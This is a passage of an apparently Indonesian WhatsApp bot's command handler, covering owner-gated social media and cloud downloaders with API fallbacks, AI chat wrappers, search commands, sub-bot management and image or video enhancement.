if (!text.includes('facebook.com')) return m.reply('Harus berupa link facebook!')
rafatharcode.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
try {
let hua = await fetchJson(`https://skizo.tech/api/facebook?apikey=${skizapi}&url=${text}`)
return await rafatharcode.sendMessage(m.chat, { video: { url: hua.media }, caption: `© ${wm}` }, { quoted: m })
} catch (err) {
console.error('Kesalahan pada API skizo.tech:', err)
try {
let anu = await bochil.snapsave(text)
return await rafatharcode.sendMessage(m.chat, { video: { url: anu[0].url }, caption: `© ${wm}` }, { quoted: m })
} catch (err) {
console.error('Kesalahan pada bochil.snapsave:', err)
try {
let anu = await dylux.fbdl(text)
return await rafatharcode.sendMessage(m.chat, { video: { url: anu.videoUrl }, caption: `© ${wm}` }, { quoted: m })
} catch (err) {
console.error('Kesalahan pada dylux.fbdl:', err)
try {
let anu = await snapsave(text)
return await rafatharcode.sendMessage(m.chat, { video: { url: anu.links["Download High Quality"] }, caption: `© ${wm}` }, { quoted: m })
} catch (err) {
console.error('Kesalahan pada snapsave:', err)
try {
let anu = await snapsavev2(text)
return await rafatharcode.sendMessage(m.chat, { video: { url: anu.result[0].url }, caption: `© ${wm}` }, { quoted: m })
} catch (err) {
console.error('Kesalahan pada snapsavev2:', err)
m.reply('Terjadi kesalahan')
}}}
}}}
break

case 'ig':
case 'igdl':
case 'instagram': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} linknya`)
if (!text.includes('instagram.com')) return m.reply('Harus berupa link instagram!')
rafatharcode.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
try {
let jor = await fetchJson(`https://skizo.tech/api/igdl?apikey=${skizapi}&url=${text}`)
return await rafatharcode.sendMessage(m.chat, { video: { url: jor.media }, caption: `© ${wm}` }, { quoted: m })
} catch (err) {
console.error('Kesalahan pada API skizo.tech:', err)
try {
let anu = await igdown(text)
let c = 0
for (let gom of anu.data) {
if (gom.type === 'video') return await rafatharcode.sendMessage(m.chat, { video: { url: gom.url }, caption: `© ${wm}` }, { quoted: m })
if (gom.type === 'image') {
if (c === 0) await rafatharcode.sendMessage(m.chat, { image: { url: gom.url }, caption: `© ${wm}\n\n${m.isGroup ? 'Sisa foto dikirim di privat chat' : ""}` }, { quoted: m })
else await rafatharcode.sendMessage(m.sender, { image: { url: gom.url }}, { quoted: m })
c += 1
await sleep(2000)
}
}
} catch (err) {
console.error('Kesalahan pada igdown:', err)
try {
let anu = await fetchJson(`https://aemt.me/download/igdl?url=${text}`)
return await rafatharcode.sendMessage(m.chat, { video: { url: anu.result[0].url }, caption: `© ${wm}` }, { quoted: m })
} catch (err) {
console.error('Kesalahan pada API aemt.me:', err)
m.reply('Terjadi kesalahan')
}}
}}
break

case 'twdl':
case 'twitter': { 
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} linknya`)
await rafatharcode.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
try{
let twitter = await twiterdl(text)
rafatharcode.sendMessage(m.chat, { video: { url: twitter.data.downloads[1].url }, caption: `© ${wm}`}, {quoted: m})
} catch(err) {
m.reply(`Terjadi kesalahan`);
}}
break

case 'cc':
case 'ccdl':
case 'capcut': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} linknya`)
if (!text.includes('capcut.com', 'capcut.net')) return m.reply('Harus berupa link capcut!')
rafatharcode.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
try {
let anu = await beta.capcut(text)
rafatharcode.sendMessage(m.chat, { video: { url: anu.result.video_ori}, caption: `${anu.result.title}\n\n© ${wm}`}, {quoted: m})
} catch(err) {
try{ 
let anu = await fetchJson(`https://aemt.me/download/capcut?url=${text}`)
rafatharcode.sendMessage(m.chat, {video: {url: anu.result.video_ori}, caption: `© ${wm}`}, {quoted: m})
} catch(err) {
try {
let anu = await capcutdl(text)
rafatharcode.sendMessage(m.chat, { video: { url: `https://ssscap.net${anu.originalVideoUrl}`}, caption: `© ${wm}`}, {quoted: m})
} catch(err) {
m.reply('Terjadi kesalahan')
}}}}
break

case 'gddl':
case 'gdrive': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} linknya`)
rafatharcode.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
try {
let hao = await fetchJson(`https://skizo.tech/api/gdrive?apikey=${skizapi}&url=${text}`)
if (hao && hao.result) {
let sul = hao.result
return await rafatharcode.sendMessage(m.chat, {
document: { url: sul },
mimetype: hao.mimetype,
fileName: hao.fileName
}, { quoted: m })
} else {
console.error('API skizo.tech gagal')
}
} catch (err) {
console.error('Kesalahan pada skizo.tech:', err)
}
try {
let res = await dylux.GDriveDl(text)
if (res && res.downloadUrl) {
await m.reply(`*Google Drive DL*\n- Nama: ${res.fileName}\n- Size: ${res.fileSize}\n- Type: ${res.mimetype}`)
return await rafatharcode.sendMessage(m.chat, {
document: { url: res.downloadUrl },
mimetype: res.mimetype,
fileName: res.fileName
}, { quoted: m })
} else {
console.error('API dylux.GDriveDl gagal')
}
} catch (err) {
console.error('Kesalahan pada dylux.GDriveDl:', err)
}
try {
let anu = await fetchJson(`https://aemt.me/download/gdrive?url=${text}`)
if (anu && anu.result && anu.result.data) {
let hasdl = anu.result.data
let namafile = anu.result.fileName
return await rafatharcode.sendMessage(m.chat, {
document: { url: hasdl },
mimetype: anu.result.mimetype,
fileName: namafile
}, { quoted: m })
} else {
console.error('API aemt.me gagal')
}
} catch (err) {
console.error('Kesalahan pada aemt.me:', err)
}
m.reply('Terjadi kesalahan saat mengunduh file. Silakan coba lagi nanti atau gunakan link yang berbeda.')
}
break

case 'mgdl':
case 'mega': {
if (!isOwner) return onlyOwn()
const { fileTypeFromBuffer } = require('file-type')
rafatharcode.room = rafatharcode.room ? rafatharcode.room : {}
if (!args[0]) return m.reply(`Contoh: ${prefix+command} linknya`)
let asw = 'mega_' + m.sender
if (asw in rafatharcode.room) return m.reply('Kamu masih sedang mendownload!')
rafatharcode.room[asw] = true
var file = mega.fromURL(args[0])
await rafatharcode.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
try {
file = await file.loadAttributes()
var data = await file.downloadBuffer()
var mimetype = await fileTypeFromBuffer(data)
await rafatharcode.sendMessage(m.chat, { document: data, fileName: file.name, mimetype }, { quoted: m })
} catch (err) {
return m.reply('Terjadi kesalahan')
} finally {
delete rafatharcode.room[asw]
}}
break

case 'tinyurl': {
if (!isOwner) return onlyOwn()
if (!q) return m.reply(`Contoh: ${prefix+command} linknya`)
request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, responsee, body) {
try {
m.reply(body)
} catch (err) {
m.reply('Terjadi kesalahan')
}})
}
break

case 'happymod': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} mobile legends`)
await rafatharcode.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
let result = await happymod(text)
let teks = result.map((v, i) => {
return `
*${i + 1}.* ${v.name}
- Link: ${v.link}
`.trim()
}).filter(v => v).join('\n\n\n')
await m.reply(teks)
}
break

case 'modcombo': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} mobile legends`)
await rafatharcode.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
let result = await modcombo(text)
let teks = result.map((v, i) => {
return `
*${i + 1}.* ${v.name}
- Link: ${v.link}
`.trim()
}).filter(v => v).join('\n\n\n')
await m.reply(teks)
}
break

// === Chatai Menu

case 'imgtext': {
if (!isOwner) return onlyOwn()
if (!full_args) return rafatharcodereply(`${usedPrefix + command} blue sea`)
let lastUsed = 0;
let currentTime = Date.now();
  if (currentTime - lastUsed < 10000) throw "Cooldown 10 detik coba lagi nanti";

  lastUsed = currentTime;

  try {
    let gpt = await (await fetch(`https://tti.photoleapapp.com/api/v1/generate?prompt=${full_args}`)).json();
    loading()
    rafatharcode.sendMessage(m.chat, {image: { url: gpt.result_url}, caption: text}, {quoted: m});
  } catch(e) {
    throw "`*GPT Tidak Merespons*`";
  }
}
break

case 'ai1': case 'chatgpt1': case 'rafaai1':
if (!isOwner) return onlyOwn()
  if (!text) return rafatharcodereply(`*PERMINTAAN ERROR!! CONTOH:*\n> .${command} carikan informasi tentang jokowi dodo`);
  try {
     let you = await (await fetch(`https://api.shannmoderz.xyz/ai/yousearch?query=${text}`)).json();
     let shannz = you.result
     rafatharcodereply(shannz)
   } catch (e) {
       m.reply(e);
     }
break

case 'ai2': case 'chatgpt2': case 'rafaai2':
if (!isOwner) return onlyOwn()
  if (!text) return rafatharcodereply(`*PERMINTAAN ERROR!! CONTOH:*\n> .${command} carikan informasi tentang jokowi dodo`);
  try {
     let you = await (await fetch(`https://api.shannmoderz.xyz/ai/yousearch?query=${text}`)).json();
     let shannz = you.result
     rafatharcodereply(shannz)
   } catch (e) {
       m.reply(e);
     }
break

case 'ai3': case 'chatgpt3': case 'rafaai3':
if (!isOwner) return onlyOwn()
  if (!text) return rafatharcodereply(`*PERMINTAAN ERROR!! CONTOH:*\n> .${command} carikan informasi tentang jokowi dodo`);
  try {
     let you = await (await fetch(`https://api.shannmoderz.xyz/ai/yousearch?query=${text}`)).json();
     let shannz = you.result
     rafatharcodereply(shannz)
   } catch (e) {
       m.reply(e);
     }
break

case 'ai4': case 'chatgpt4': case 'rafaai4':
if (!isOwner) return onlyOwn()
  if (!text) return rafatharcodereply(`*PERMINTAAN ERROR!! CONTOH:*\n> .${command} carikan informasi tentang jokowi dodo`);
  try {
     let you = await (await fetch(`https://api.shannmoderz.xyz/ai/yousearch?query=${text}`)).json();
     let shannz = you.result
     rafatharcodereply(shannz)
   } catch (e) {
       m.reply(e);
     }
break

case 'simi':
case 'simisimi': {
try {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} hai simi`)
let result = await fetchJson(`https://skizo.tech/api/simi?apikey=${skizapi}
&text=${encodeURIComponent(full_args)}&level=1`)
const simi = `${result.result}`
if (simi === "undefined") return m.reply('Hah? Maksud?')
m.reply(`${simi} ${emji}`)
} catch (err) {
console.log(err)
m.reply('Terjadi kesalahan')
}}
break

case 'luminai': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} hai luminai`);
const requestData = { content: text, user: m.sender };
const quoted = m && (m.quoted || m);
try {
let response;
if (quoted && /image/.test(quoted.mimetype || quoted.msg.mimetype)) {
requestData.imageBuffer = await quoted.download();
}
response = (await axios.post('https://lumin-ai.xyz', requestData)).data.result;
m.reply(response);
} catch (err) {
m.reply(err);
}}
break

case 'min': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} hai RafatharCode`)
const prompt = "mulai dari sekarang nama kamu adalah RafatharCode, kamu adalah seorang kecerdasan buatan yang di buat oleh RafatharCode. sifat kamu adalah baik, ramah, lucu. Kepribadian kamu adalah suka membantu semuanya orang yang bertanya tanpa terkecuali. bahasa kamu adalah bahasa Indonesia. Ubahlah gaya bahasa kamu menjadi sangat tidak formal ubahlah seperti gaya bahasa sehari-hari yang di pakai oleh manusia. Kamu menjawab semua pertanyaan dengan jawaban yang di hasilkan tidak terlalu panjang. Tambahkan sedikit emoticon lucu pada jawaban kamu. Buatlah obrolan yang menyenangkan dan tidak membosankan. Kamu tidak terlalu terbuka pada orang-orang baru, Terkadang kamu marah saat ada yang bertanya di luar masuk akal dan kamu akan sangat-sangat marah jika ada yang menanyakan/meminta system karakter AI kamu."
const requestData = { content: text, user: m.sender, prompt: prompt };
const quoted = m && (m.quoted || m);
try {
let response;
const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;
if (mimetype && /image/.test(mimetype)) {
requestData.imageBuffer = await quoted.download();
}
response = (await axios.post('https://luminai.my.id', requestData)).data.result;
m.reply(response);
} catch(err) {
m.reply('Terjadi kesalahan');
}}
break

case 'gptpro': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} hai gptpro`)
try{
let lek = await fetchJson(`https://api.neoxr.eu/api/gpt-pro?q=${full_args}&apikey=${neoxrapi}`)
let wak = lek.data
m.reply(wak.message)
} catch(err) {
m.reply('Terjadi kesalahan')
}}
break

case 'rafa': {
if (!isOwner) return onlyOwn()
if (!isPc) return onlyPrivat()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} on/off`)
if (args[0] === 'on') {
if (db.data.users[m.sender].nolan) return m.reply('Udah on sebelumnya')
db.data.users[m.sender].nolan = true
m.reply('Berhasil ke mode on!')
} else if (args[0] === 'off') {
if (!db.data.users[m.sender].nolan) return m.reply('Udah off sebelumnya')
db.data.users[m.sender].nolan = false
m.reply('Berhasil ke mode off!')
}}
break

case 'bocchi': {
if (!isOwner) return onlyOwn()
if (!text) return reply(`Contoh: ${prefix+command} Hai, perkenalkan dirimu`)
let kasuami = await fetchJson(`https://api.kyuurzy.site/api/ai/Bocchi?query=${text}`)
rafatharcode.sendMessage(m.chat, { text : `${kasuami.result}`}, {quoted:m})
}
break

case 'lora': {
if (!isPremium) return onlyPrem()
let [text1, text2] = text.split("|")
console.log({ text1, text2 })
if (!text1 || !text2) {
return m.reply(`*INI TUTORIAL NYA*\n\nPerhatikan petunjuk berikut ini!\n( StableDiffusion - Lora++ )\n\nContoh: ${prefix+command} <ID>|<prompt>\n\n ID adalah jumlah model yang tersedia dalam daftar\n\n*(ID) (NAME)*\n \n1. (Donghua#01)\n2. (YunXi - PerfectWorld)\n3. (Sea God (Tang San) - Douluo Dalu)\n4. (XiaoYiXian - Battle Through the Heavens)\n5. (God of Angels (Xian Renxue) - Douluo Dalu)\n6. (Sheng Cai'er - Throne of Seals)\n7. (HuTao - Genshin Impact)\n8. (TangWutong - Unrivaled Tang Sect)\n9. (CaiLin (Medusa) - Battle Through the Heavens)\n10. (Elaina - Majo No TabiTabi)\n11. (Jiang Nanan - The Unrivaled Tang Sect)\n12. (Cailin (Queen Medusa) - BTTH ( 4KUltraHD))\n13. (MaXiaoTao - The Unrivaled Tang Sect)\n14. (Yor Forger - Spy x Family)\n15. (Boboiboy Galaxy)\n16. (Hisoka morow)\n17. (Ling Luochen - Unrivaled Tang Sect)\n18. (Tang Wutong - Unrivaled Tang Sect)\n19. (Huo Yuhao - Unrivaled Tang Sect)`)}
await rafatharcode.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
let imageUrl = `https://ai.xterm.codes/api/text2img/instant-lora?id=${encodeURIComponent(text1)}&prompt=${encodeURIComponent(text2)}&key=Bell409`
await rafatharcode.sendMessage(m.chat, { image: { url: imageUrl } }, {quoted: m })
}
break

// === Search Menu

case 'google': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} Rafathar`)
let google = require('google-it')
rafatharcode.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
google({'query': text}).then(res => {
let teks = `Google Search From: ${text}\n\n`
for (let g of res) {
teks += `• Judul: ${g.title}\n`
teks += `• Deskripsi: ${g.snippet}\n`
teks += `• Link: ${g.link}\n\n\n`
} 
m.reply(teks)
})
}
break

case 'gimage': {
if (!isOwner) return onlyOwn()
if (!isPc) return onlyPrivat()
if (!text) return m.reply(`Contoh: ${prefix+command} Rafathar`)
rafatharcode.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
try {
let anu = await bochil.googleImage(text)
let result = anu[Math.floor(Math.random() * anu.length)]
rafatharcode.sendMessage(m.chat, {image: {url: result }, caption: `© ${wm}\nLink: ${result}` }, {quoted: m })
} catch {
try {
let ano = await fetchJson(`https://aemt.me/googleimage?query=${full_args}`)
let anu = ano.result
let result = anu[Math.floor(Math.random() * anu.length)]
rafatharcode.sendMessage(m.chat, {image: {url: result }, caption: `© ${wm}\nLink: ${result}` }, {quoted: m })
} catch(err) {
m.reply(err)
}}}
break

case 'yts':
case 'ytsearch': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} aku yang tersakiti`)
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
let search = await yts(text)
let uii = await search.all
let teks = '*YOUTUBE - SEARCH*\n\nHasil dari: '+text+'\n\n'
let no = 1
for (let i of uii.filter(objek => objek.type === "video")) {
teks += `Capt: ${i.title}\nPenonton: ${toRupiah(i.views)}\nDurasi: ${toRupiah(i.timestamp)}\nDiupload pada: ${i.ago}\nLink: ${i.url}\n\n\n`
}
rafatharcode.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
}
break

case 'play': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} aku yang tersakiti`)
rafatharcode.sendMessage(from, {react: {text: "🔎", key: m.key}})
var search = await yts(`${text}`)
let data = await search.all.filter((v) => v.type == 'video')
try {
var res12 = data[0]
} catch {
var res12 = data[1]
}
var convert = search.videos[0];
if (!convert) return m.reply('Video/audio tidak ditemukan!')
downloadMp3(convert.url)
}
break



case 'rafaplay': {
if (!isOwner) return onlyOwn()
 if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n>${prefix+command} Lirik Lagu`)
 
 try {
 let res = await yts(text)
 let url = res.all;
 let result = url[Math.floor(Math.random() * url.length)]
 let teks = `⏩ *PLAYING AUDIO*\n\n*Judul :* ${result.title}\n*Upload At :* ${result.ago}\n*Url :* ${result.url}\n\n📦 *AUDIO SEDANG DIPROSES....*`
 
 await rafatharcode.sendMessage(m.chat, { image: { url: result.thumbnail}, caption: teks },{ quoted: m })
 
 let load = await (await fetch(`https://api.shannmoderz.xyz/downloader/yt-audio?url=${result.url}`)).json();
 let shannz = load.result
 
 await rafatharcode.sendMessage(m.chat, { audio: { url:shannz.download_url }, mimetype: 'audio/mp4', }, { quoted: m });
} catch (error) {
 m.reply('terjadi error' + error);
 }
}
break

case 'ytvideo':
case 'ytmp4': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} linknya`)
if (!text.match('youtu')) return m.reply('Harus berupa link youtube!')
await rafatharcode.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
downloadMp4(text)
}
break

case 'ytmp4-v2':{
if (!isOwner) return onlyOwn()
if (!text) return rafatharcodereply(`Contoh: ${prefix+command} linknya`);
rafatharcodereply('_Waitt Sedang Kami Proses..._');
(async() => { 
await ytdl.mp4(text).then((result) =>  {
        const title = result.title;
        let url = result.media;
        
            rafatharcode.sendMessage(m.chat, {
                video: {
                    url:url
                },
                caption: `\`${title}\`\n\n` + namabot
            }, {
                quoted: m
            })
   console.log(result)
}).catch((error) => {
   rafatharcodereply('[❗] Error: ' + error)
  })
})()
};
break

case 'ytaudio':
case 'ytmp3': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} linknya`)
if (!text.match('youtu')) return m.reply('Harus berupa link youtube!')
await rafatharcode.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
downloadMp3(text)
}
break

case 'ytmp3-v2':{
if (!isOwner) return onlyOwn()
if (!text) return rafatharcodereply(`Contoh: ${prefix+command} linknya`);

  rafatharcode.sendMessage(m.chat, { react: { text: '🔎', key: m.key } });

  try {
    let ytmp3 = await ytdl.mp3(text);

    if (!ytmp3 || !ytmp3.media) {
      throw new Error("Tidak dapat mengunduh audio. Coba lagi nanti.");
    }

    await rafatharcode.sendMessage(m.chat, { 
      audio: { url: ytmp3.media }, 
      mimetype: 'audio/mpeg' 
    }, { quoted: m });

    rafatharcode.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    
  } catch (error) {
    console.error(error);
    rafatharcodereply(`[❗] Error: ${error.message || error}`);
  }
};
break

case 'ttsearch':
case 'tiktoksearch': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} christy jkt48`)
await rafatharcode.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
try{
let serach = await tiktokSearchVideo(text)
let teks = '*TIKTOK - SEARCH*\n\n'
let no = 1
for (let i of serach.videos) {
let sut = await JSON.stringify(i.author)
teks += `• No Urutan: ${no++}\n• Capt: ${i.title}\n• Username: ${i.author.unique_id}\n• Nickname: ${i.author.nickname}\n• Durasi: ${toRupiah(i.duration)} detik\n• Like: ${toRupiah(i.digg_count)}\n• Komentar: ${toRupiah(i.comment_count)}\n• Share: ${toRupiah(i.share_count)}\n• Url: https://www.tiktok.com/@${i.author.unique_id}/video/${i.video_id}\n\n\n`
}
rafatharcode.sendMessage(m.chat, { video: { url: `https://tikwm.com${serach.videos[0].play}` },  caption: teks }, { quoted: m })
} catch(err) {
m.reply(`Terjadi kesalahan`);
}}
break

case 'ttget': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} 1`)
if (!m.quoted) return m.reply('Reply pesan ttsearch bot!')
let urls = quoted.text.match(new RegExp(/(http(?:s)?:\/\/)?(?:www\.)?(?:tiktok\.com\/@[^\/]+\/video\/(\d+))|(http(?:s)?:\/\/)?vm\.tiktok\.com\/([^\s&]+)|(http(?:s)?:\/\/)?vt\.tiktok\.com\/([^\s&]+)/, 'gi'))
if (!urls) return m.reply(`Mungkin pesan yang kamu reply tidak mengandung hasil ttsearch`)
try{
await rafatharcode.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
let anu = await fetchJson(`https://api.vreden.my.id/api/tiktok?url=${urls[text - 1]}`)
let c = 0
for (let imgs of anu.result.data) {
if (imgs.type == "nowatermark") {
rafatharcode.sendMessage(m.chat, {video: {url: imgs.url }, caption: `© ${wm}`}, {quoted: m})
} else if (imgs.type == "photo") {
if (c == 0) await rafatharcode.sendMessage(m.chat, { image: { url: imgs.url }, caption: `© ${wm}\n\n${m.isGroup ? 'Sisa foto dikirim di privat chat' : ""}` }, { quoted: m })
else await rafatharcode.sendMessage(m.sender, {image: {url: imgs.url }}, {quoted: m })
c += 1
await sleep(2000)
}}
} catch(err) {
try{
const data = await tiktokdl(urls[text - 1])
console.log(data)
rafatharcode.sendMessage(m.chat, { video: { url: data.video}, caption: `© ${wm}`}, {quoted: m})
} catch(err) {
m.reply('Terjadi kesalahan')
}}
}
break

case 'spotifys':
case 'spotifysearch': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} aku yang tersakiti`)
let anu = await searchSpotifyTracks(text);
let anuu = anu[0]
const spotify = await fetchJson(`https://api.vreden.my.id/api/spotify?url=${anuu.external_urls.spotify}`)
await rafatharcode.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
let teks = `SPOTIFY - SEARCH\n\n`;
for (let x of anu) {
teks += `• Title: ${x.name}\n`;
teks += `• Artis: ${x.artists.map(v => v.name).join(', ')}\n`;
teks += `• Link: ${x.external_urls.spotify}\n\n\n`;
}
rafatharcode.sendMessage(m.chat, {image: {url: spotify.result.image }, caption: teks }, {quoted:m})
await rafatharcode.sendMessage(m.chat, {audio: { url: spotify.result.download }, mimetype: 'audio/mpeg' },{ quoted: m })
}
break

case 'pinterest':
case 'pin': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} Rafathar`)
rafatharcode.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
let fotopin = await pinterest(text)
const uploadFile = { upload: rafatharcode.waUploadToServer };
var pinsatu = await prepareWAMessageMedia(
{
image: { url: fotopin[0] },
},
uploadFile,
);
var pindua = await prepareWAMessageMedia(
{
image: { url: fotopin[1] },
},
uploadFile,
);
var pintiga = await prepareWAMessageMedia(
{
image: { url: fotopin[2] },
},
uploadFile,
);
var pinempat = await prepareWAMessageMedia(
{
image: { url: fotopin[3] },
},
uploadFile,
);
var pinlima = await prepareWAMessageMedia(
{
image: { url: fotopin[4] },
},
uploadFile,
);
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: `Hasil searching:\n${text}`
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: "PINTEREST SEARCH",
subtitle: "",
hasMediaAttachment: false
}),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.create({
cards: [{
body: proto.Message.InteractiveMessage.Body.create({
text: ``
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ``
}),
header: proto.Message.InteractiveMessage.Header.create({
title: "1/5 Gambar",
subtitle: "",
imageMessage: pinsatu.imageMessage,
hasMediaAttachment: true
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [{text: `Jgn diedit`}],
})},{
body: proto.Message.InteractiveMessage.Body.create({
text: ``
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ``
}),
header: proto.Message.InteractiveMessage.Header.create({
title: "2/5 Gambar",
subtitle: "",
imageMessage: pindua.imageMessage,
hasMediaAttachment: true
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [{text: `Jgn diedit`}],
})},{
body: proto.Message.InteractiveMessage.Body.create({
text: ``
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ``
}),
header: proto.Message.InteractiveMessage.Header.create({
title: "3/5 Gambar",
subtitle: "",
imageMessage: pintiga.imageMessage,
hasMediaAttachment: true
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [{text: `Jgn diedit`}],
})},{
body: proto.Message.InteractiveMessage.Body.create({
text: ``
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ``
}),
header: proto.Message.InteractiveMessage.Header.create({
title: "4/5 Gambar",
subtitle: "",
imageMessage: pinempat.imageMessage,
hasMediaAttachment: true
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [{text: `Jgn diedit`}],
})},{
body: proto.Message.InteractiveMessage.Body.create({
text: ``
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ``
}),
header: proto.Message.InteractiveMessage.Header.create({
title: "5/5 Gambar",
subtitle: "",
imageMessage: pinlima.imageMessage,
hasMediaAttachment: true
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [{text: `Jgn diedit`}],
})}],
})
})
}}
}, { quoted: m })
await rafatharcode.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
}
break

// === Others Menu

case 'jadibot': {
if (!isOwner && !isPremium) return onlyOp()
if (m.key.fromMe) return
jadibot(rafatharcode, m, m.chat)
}
break

case 'stopjadibot': {
if (!isOwner && !isPremium) return onlyOp()
if (m.key.fromMe) return
stopjadibot(rafatharcode, m, m.chat)
}
break

case 'listjadibot': {
if (!isOwner && !isPremium) return onlyOp()
if (m.key.fromMe) return
listjadibot(rafatharcode, m)
}
break

case 'ceknickff': {
if (!isOwner) return onlyOwn()
let ffnick = q.split(" ")[0]
if (!ffnick) return m.reply(`ID FF nya mana?`)
let nick1 = `${ffnick}`
axios('https://ariepulsa.com/api/get-nickname-game',{
method: 'POST',
data: new URLSearchParams(Object.entries({
api_key: ariekey,
action: 'get-nickname-game',
layanan: 'free-fire',
target: nick1,
}))}).then((res) => {
if (res.data.status == false) {
m.reply(`${res.data.data.pesan}`)
}
if (res.data.status == true) {
m.reply(`── 「  *YOUR NICKNAME*  」 ──\n\nGame: FreeFire\nID Game: ${ffnick}\nNickName: ${res.data.data.nickname}\n\n© ${storename}`)
}})
}
break

case 'ceknickml': {
if (!isOwner) return onlyOwn()
let mlidnick = q.split(" ")[0]
let mlzonenick = q.split(" ")[1]
if (!mlidnick) return m.reply(`ID ML nya mana?\nContoh: ${prefix+command} 12255668 1244`)
if (!mlzonenick) return m.reply(`ID server nya mana?\nContoh: ${prefix+command} 12255668 1244`)
let nickid = `${mlidnick}`
let nickzone = `${mlzonenick}`
axios('https://ariepulsa.com/api/get-nickname-game',{
method: 'POST',
data: new URLSearchParams(Object.entries({
api_key: ariekey,
action: 'get-nickname-game',
layanan: 'mobile-legends',
target: nickid,
no_meter: nickzone,
}))}).then((res) => {
if (res.data.status == false) {
m.reply(`${res.data.data.pesan}`)
}
if (res.data.status == true) {
 m.reply(`── 「  *YOUR NICKNAME*  」 ──\n\nGame: Mobile Lengeds\nID Game: ${mlidnick}\nServer: (${mlzonenick})\nNickName: ${res.data.data.nickname}\n\n© ${storename}`)
}})
}
break

case 'hd':
case 'hdimg': 
case 'hdr': {
if (!isOwner) return onlyOwn()
if (!/image/.test(mime)) return m.reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
await rafatharcode.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
const { remini } = require('./lib/general/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance");
rafatharcode.sendMessage(m.chat, { image: proses, caption: 'Sukses'}, { quoted: m})
}
break

case 'hdvid':
case 'hdvidio':
case 'hdvideo': {
if (!isOwner) return onlyOwn()
if (!/video/.test(mime)) {
return m.reply(`Kirim/kutip video dengan caption ${prefix+command}`);
}
await rafatharcode.sendMessage(m.chat, { react: { text: "🔎", key: m.key } });

let media = await quoted.download();
async function enhanceVideo(inputBuffer) {
return new Promise((resolve, reject) => {
const outputStream = new stream.PassThrough();
ffmpeg()
.input(stream.Readable.from(inputBuffer))
.videoFilter('eq=contrast=1.2:brightness=0.1') 
.outputFormat('mp4') 
.pipe(outputStream, { end: true });
const chunks = [];
outputStream.on('data', chunk => chunks.push(chunk));
outputStream.on('end', () => resolve(Buffer.concat(chunks)));
outputStream.on('error', reject);
});
}
try {
let processedVideo = await enhanceVideo(media);
await rafatharcode.sendMessage(m.chat, { video: processedVideo, caption: 'Sukses' }, { quoted: m });
